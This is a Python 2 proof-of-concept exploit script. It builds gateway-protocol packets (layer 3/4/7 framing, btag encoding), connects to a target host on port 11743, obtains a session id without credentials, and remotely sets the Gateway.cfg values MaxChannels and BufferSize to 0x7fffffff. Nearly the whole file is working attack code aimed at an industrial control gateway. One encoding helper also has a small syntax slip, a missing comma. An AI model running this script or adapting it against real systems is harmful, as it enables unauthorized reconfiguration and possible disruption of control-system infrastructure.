import sys, socket, random, string, binascii, argparse
from struct import *

# Got it from the Internet 
def hexdump(src, length=16):
  DISPLAY = string.digits + string.letters + string.punctuation
  FILTER = ''.join(((x if x in DISPLAY else '.') for x in map(chr, range(256))))
  lines = []
  for c in xrange(0, len(src), length):
    chars = src[c:c+length]
    hex = ' '.join(["%02x" % ord(x) for x in chars])
    if len(hex) > 24:
      hex = "%s %s" % (hex[:24], hex[24:])
    printable = ''.join(["%s" % FILTER[ord(x)] for x in chars])
    lines.append("%08x:  %-*s  %s\n" % (c, length*3, hex, printable))
  return ''.join(lines)

def dump(title, data):
  print '--- [ %s ] --- ' % (title)
  print hexdump(data) 

def recvall(sock, n):
  data = ''
  while len(data) < n:
      packet = sock.recv(n - len(data))
      if not packet:
          return None
      data += packet
  return data

def tcp_blk_drv_send(sock, data):
  pdu = pack('<II',0xe8170100, len(data) + 8) + data
  dump('L3 req', data)
  sock.sendall(pdu)

def tcp_blk_drv_recv(sock):
  data = ''
  # Read 0x8-byte header
  data = recvall(sock, 0x8)
  
  # Parse header 
  (magic, size) = unpack('<II', data)

  if magic != 0xe8170100:
    raise ValueError('Invalid magic number.')
 
  # Get data if any 
  if size:
    data = recvall(sock, size - 8)

  dump('L3 res', data)
  
  return data


def layer3(service, data, sender='\x00'*8, receiver='\x00'*6):

  slrl = ((len(sender) / 2) << 4) | ((len(receiver) / 2) & 0xf)
  hc = 13 # Hop count
  hl = 3  # Offset (in words) to receiver addr
  b2 = ((hc << 3) & 0xf8) | (hl & 0x7)

  pri = 1          # Packet priority; 0 low, 1 normal, 2 high, 3 emergency
  sr = 0           # SignalRouter bit; set by router
  addr_type = 0    # Address type; 0 = direct/absolute address; 1 = relative
  max_blk_len = 0  # Max blcok len: compute as (x+1)*32
  msg_id = 0

  b3 =  ((pri << 6) & 0xc0) | ((sr << 5) & 0x20)
  b3 |= ((addr_type << 4) & 0x10) | (max_blk_len & 0xf)

  pdu  = pack('BBBBBB', 0xc5, b2, b3, service, msg_id, slrl) 
  pdu += receiver
  pdu += sender
  
  if len(pdu) % 4:
    pdu += '\x00' * (4 - len(pdu) % 4)

  pdu += data # Service/L4 data
 
  return pdu; 

''' Only support type 1 (ack and send data)'''
def layer4(chan, blk, ack, flags, data):

  pdu  = '\x01' # ACK and send data
  pdu += pack('<BHII',flags, chan, blk, ack) 
  pdu += data # Layer 7 data

  return pdu

''' Layer4 meta request'''
def layer4_meta(type, data):

  type |= 0xC0 # Meta request from client
  pdu  = pack('<BBH', type, 0, 0x0101)  
  pdu = pdu + pack('<i', binascii.crc32(pdu + '\x00'*4 + data)) + data 
  return pdu

''' Only support protocol 0xCD55'''
def layer7(svc_group, svc_num, sess_id, data):

  hdr  = pack('<HHII',svc_group, svc_num, sess_id, len(data))
  hdr += pack('<HH', 0, 0) 

  pdu  = pack('<HH',0xcd55, len(hdr))
  pdu += hdr 
  pdu += data # Layer7 body 

  pdu = pack('<Ii', len(pdu), binascii.crc32(pdu)) + pdu 

  return pdu

def btag_encode_int(val):
  # 7 bits
  if(val <= 0x7f):
    return pack('B',val)
  # 14 bits
  elif (val <= 0x3fff):
    return pack('BB',(val & 0x7f) | 0x80, (val >> 7) & 0x7f)
  # 21 bits
  elif (val <= 0x1fffff):
    return pack('BBB', 
      (val & 0x7f) | 0x80, 
      (val >> 7) | 0x80, 
      (val >> 14) & 0x7f
    )
  # 28 bits
  elif (val <= 0xfffffff):
    return pack('BBBB'
      (val & 0x7f)  | 0x80, 
      (val >> 7)    | 0x80, 
      (val >> 14)   | 0x80,
      (val >> 21) & 0x7f 
    )
  # TODO: encode larger int
  else:
    raise ValueError('Value too big to encode.')

def btag_decode_int(data, pos):
  max = 0xffffffff
  lshift = 0
  dlen = len(data)

  val = 0
  t = 0
  while True: 
    if(pos >= dlen):
      return None 

    t = ord(data[pos])
    if((t & 0x7f) > max):
       return None 
      
    val += ((t & 0x7f) << lshift)
    pos += 1
    lshift += 7
    max = max >> 7
  
    if (t & 0x80 == 0):
      break
   
  return [val, pos]

def btag_parse(data, pos):
  # Tag id
  ret = btag_decode_int(data, pos)
  if ret == None:
    return None
  id  = ret[0]
  pos = ret[1]
  
  # Tag length 
  ret = btag_decode_int(data, pos)
  if ret == None:
    return None
    
  size  = ret[0]
  pos = ret[1]

  # Tag  value 
  value = data[pos:pos+size]
  pos += size

  return [id, value, pos]


def get_btags(data):
  dlen = len(data)
  pos = 0
  tags = {} 
  while pos < dlen: 
    ret = btag_parse(data, pos)
    if ret == None:
      return None
    id = ret[0]
    value = ret[1]
    pos   = ret[2] 
    tags[id] = value
  
  return tags

def btag(id, value):
  tag  = btag_encode_int(id)         # Tag id 
  tag += btag_encode_int(len(value)) # Tag length
  tag += value                       # Tag value 
  
  return tag 

def get_layer4(L3):
  hdr_len = ord(L3[1]) & 0x7  
  slrl = (ord(L3[5]) >> 4) | (ord(L3[5]) & 0xf)
  pos = hdr_len + slrl
  pos = pos + (pos % 2)  
  pos = pos * 2 

  return L3[pos:]

def get_layer7(L4):
  return L4[20:]

def get_layer7_body(data, layer):
  if layer == 3:
    L4 = get_layer4(data)
    L7 = get_layer7(L4)
  elif layer == 4:
    L7 = get_layer7(data)
  elif layer == 7:
    L7 = data
  else:
    raise ValueError('Invalid layer')
    
  (proto, hdr_size,) = unpack_from('<HH',L7)
  if proto != 0xcd55:
    raise ValueError('Invalid layer 7 protocol')

  return L7[(4 + hdr_size):]

''' Layer7 data fragmentation not supported '''
def send_layer7(soc, channel, blk, ack, data):
  L4 = layer4(channel, blk, ack, 0x81, data)
  L3 = layer3(64, L4)
  tcp_blk_drv_send(soc, L3)
  blk += 1 # Next block to send
  return blk

''' SettgSetIntValue'''
def SettgSetIntValue(sess_id, cmp, key, val):
  cmp = btag(0x10, cmp + '\x00')
  key = btag(0x11, key + '\x00')
  val = btag(0x12, pack('<i',val))
  data = btag(0x81, cmp + key + val) 
  L7  = layer7(6, 2, sess_id, data) 
  return L7

#
# MAIN
#
desc = 'This PoC attempts to modify settings in Gateway.cfg.'

arg_parser = argparse.ArgumentParser(desc)
arg_parser.add_argument('-t', required=True, help='Target IP (Required)')
arg_parser.add_argument('-p', type=int, default=11743, help='DWRCS.exe port, default: 11743')

args = arg_parser.parse_args()
host = args.t
port = args.p

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(10)
s.connect((host, port))

# Open a channel 
data = pack('<II',random.randint(1, 0xffffffff),0x1f4000) 
data += '\x08\x00\x00\x00'

L4 = layer4_meta(3,data)
L3 = layer3(64, L4)

tcp_blk_drv_send(s, L3)
res = tcp_blk_drv_recv(s) 

L4 = get_layer4(res)

# Get status and channel ID
(status,channel,) = unpack_from('<HH', L4, 12)

if status != 0 or channel == 0xffff or channel == 0:
  print 'Failed to open a channel.'
  s.close()
  sys.exit(1)
  
#
# Get a session id
# 
blk = 1
ack = 0
tag_10 = btag(0x10, '\x00\x00')
data = btag(0x22, pack('<H', 1)) + btag(0x81, tag_10)
L7 = layer7(1,2,0x11,data) 
blk = send_layer7(s, channel, blk, ack, L7)
res = tcp_blk_drv_recv(s) 

L4 = get_layer4(res)
#dump('L4 res', L4)
ack = unpack_from('<I', L4, 4)[0]

L7_body = get_layer7_body(L4, 4)
#dump('L7 res body', L7_body)

tags = get_btags(L7_body)

if 0x82 not in tags:
  print 'btag 0x82 not found in response'
  s.close()
  sys.exit(1)

data = tags[0x82]
tags = get_btags(data)

if not all (k in tags for k in (0x20, 0x21)):
  print 'btag 0x20 or 0x21 not found in response'
  s.close()
  sys.exit(1)

status  = tags[0x20]
sess_id = tags[0x21]

if len(status) != 2:
  print 'Length of status btag is not 2 bytes'
  s.close()
  sys.exit(1)

status = unpack('<H', status)[0] 
if status != 0:
  print 'Response status not ERR_OK'
  s.close()
  sys.exit(1)
 
if len(sess_id) != 4:
  print 'Length of session id btag is not 4 bytes'
  s.close()
  sys.exit(1)

sess_id = unpack('<I', sess_id)[0]

L7 = SettgSetIntValue(sess_id, 'CmpChannelServer', 'MaxChannels', 0x7fffffff)
blk = send_layer7(s, channel, blk, ack, L7)
res = tcp_blk_drv_recv(s) 
L4 = get_layer4(res)
#dump('L4 res', L4)
ack = unpack_from('<I', L4, 4)[0]

L7 = SettgSetIntValue(sess_id, 'CmpChannelServer', 'BufferSize', 0x7fffffff)
blk = send_layer7(s, channel, blk, ack, L7)

res = tcp_blk_drv_recv(s) 
L4 = get_layer4(res)
#dump('L4 res', L4)
ack = unpack_from('<I', L4, 4)[0]
